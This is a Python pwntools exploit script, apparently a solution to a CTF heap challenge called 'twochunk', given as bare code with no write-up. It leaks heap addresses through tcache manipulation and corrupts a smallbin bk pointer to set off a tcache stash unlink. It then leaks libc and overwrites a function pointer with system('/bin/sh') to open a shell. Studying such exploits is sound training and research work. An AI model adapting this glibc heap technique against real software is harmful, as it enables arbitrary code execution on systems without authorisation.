#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./twochunk')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def intro(name, msg):
    p.recvuntil('name: ')
    p.send(name)
    sleep(0.1)
    p.recvuntil('your message: ')
    p.send(msg)
    sleep(0.1)

def cmd(c):
    p.recvuntil('choice: ')
    p.sendline(str(c))

def add(idx, sz):
    cmd(1)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('size: ')
    p.sendline(str(sz))

def free(idx):
    cmd(2)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def show(idx):
    cmd(3)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def edit(idx, content):
    cmd(4)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('content: ')
    p.send(content)
    sleep(0.1)

buf = 0x23333000 + 0x30
intro(p64(buf - 0x10) * 6, p64(0xdeadbeef))
for i in range(5):
    add(0, 0x88)
    free(0) # fillup tcache 0x90
# leak heap
add(0, 0xE9)
free(0) # put into tcache 0x100
add(0, 0xE9)
free(0) # put into tcache 0x100
add(0, 0x5B25) # get a chunk from tcache 0x100
show(0)
heap_base = u64(p.recv(8)) - 0x570
info('heap_base = ' + hex(heap_base))

free(0)
for i in range(7):
    add(0, 0x188)
    free(0) # fillup tcache 0x190
# create smallbins
add(0, 0x188)
add(1, 0x308) # padding
free(0) # put into unsortedbin
add(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90
free(0)
add(0, 0x108) # trigger consolidate ; put into smallbin 0x90
free(0)
free(1)
# repeat
add(0, 0x188)
add(1, 0x308) # padding
free(0) # put into unsortedbin
free(1)
add(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90
add(1, 0x108) # trigger consolidate ; put into smallbin 0x90
#gdb.attach(p)

target = 0x23333000
payload = b'\x00' * 0xf0 + p64(0) + p64(0x91) + p64(heap_base + 0x1350) + p64(target - 0x10)
#payload = p64(0xdeadbeef)
edit(0, payload) # overwrite smallbins' bk
free(1)
add(1, 0x88) # trigger smallbin stash unlink
# leak libc
cmd(5)
p.recvuntil('message: ')
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, b'\x00')) - 0x1ebc60
info('libc_base = ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
cmd(6)
payload = p64(system_addr).ljust(0x30, b'\x00') + p64(bin_sh_addr) + p64(0) + p64(0)
p.send(payload)
cmd(7)
#gdb.attach(p)
p.interactive()

